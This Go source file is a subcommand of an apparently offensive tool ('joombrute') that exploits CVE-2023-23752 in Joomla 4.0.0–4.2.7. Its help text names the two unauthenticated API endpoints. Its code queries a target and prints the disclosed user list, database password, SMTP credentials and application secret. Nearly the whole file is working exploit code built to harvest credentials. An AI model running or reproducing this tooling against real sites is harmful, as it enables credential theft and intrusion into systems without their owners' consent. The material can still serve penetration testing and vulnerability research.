package main

import (
	"context"
	"fmt"
	"time"

	"github.com/rvzsec/joombrute/internal/httpx"
	"github.com/rvzsec/joombrute/internal/joomla"
	"github.com/rvzsec/joombrute/internal/output"
	"github.com/rvzsec/joombrute/internal/recon"
	"github.com/spf13/cobra"
)

func newEnumCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "enum",
		Short: "Exploit CVE-2023-23752 to dump usernames and DB credentials",
		Long: `Probe the unauthenticated Joomla Webservices API endpoints exposed on
versions 4.0.0 - 4.2.7:

  /api/index.php/v1/users?public=true
  /api/index.php/v1/config/application?public=true

The first returns the full user list (name, username, email, group memberships,
last login). The second returns the live application configuration including
the database host, user, password, and SMTP credentials in plaintext.

Patched in 4.2.8 (2023-02-16). CISA KEV since 2024-01-08.`,
		RunE: runEnum,
	}
	return cmd
}

func runEnum(_ *cobra.Command, _ []string) error {
	if gflags.URL == "" {
		return fmt.Errorf("--url is required")
	}
	sink, closer := buildSink()
	defer closer()

	t, err := joomla.NewTarget(gflags.URL)
	if err != nil {
		return err
	}

	client, err := httpx.New(httpx.Config{
		Timeout:         10 * time.Second,
		Proxy:           gflags.Proxy,
		UserAgent:       gflags.UserAgent,
		InsecureTLS:     gflags.InsecureTLS,
		FollowRedirects: true,
	})
	if err != nil {
		return err
	}

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	res, err := recon.RunCVE2023_23752(ctx, client, t)
	if err != nil {
		return err
	}

	if !res.HasFindings() {
		sink.Infof("CVE-2023-23752: no findings (target appears patched or behind WAF)")
		return nil
	}

	if len(res.Users) > 0 {
		sink.Hit(output.Hit{
			Target:  t.String(),
			Outcome: "info-disclosure",
			Note:    fmt.Sprintf("CVE-2023-23752: %d users disclosed at %s", len(res.Users), res.UsersURL),
		})
		for _, u := range res.Users {
			blocked := ""
			if u.Block != 0 {
				blocked = " [BLOCKED]"
			}
			sink.Infof("  user: %s  email=%s  name=%q  last=%s%s",
				u.Username, u.Email, u.Name, u.LastVisitDate, blocked)
		}
	}

	if res.DBConfig != nil {
		sink.Hit(output.Hit{
			Target:  t.String(),
			Outcome: "info-disclosure",
			Note:    fmt.Sprintf("CVE-2023-23752: DB credentials disclosed at %s", res.ConfigURL),
		})
		sink.Infof("  db.type=%s  db.host=%s  db.name=%s  db.user=%s  db.prefix=%s",
			res.DBConfig.DBType, res.DBConfig.DBHost, res.DBConfig.DBName, res.DBConfig.DBUser, res.DBConfig.DBPrefix)
		if res.DBConfig.DBPass != "" {
			sink.Infof("  db.password=%s", res.DBConfig.DBPass)
		}
		if res.DBConfig.MailerHost != "" {
			sink.Infof("  smtp.host=%s  smtp.user=%s  smtp.pass=%s",
				res.DBConfig.MailerHost, res.DBConfig.MailerUser, res.DBConfig.MailerPass)
		}
		if res.DBConfig.SecretKey != "" {
			sink.Infof("  app.secret=%s", res.DBConfig.SecretKey)
		}
	}
	return nil
}
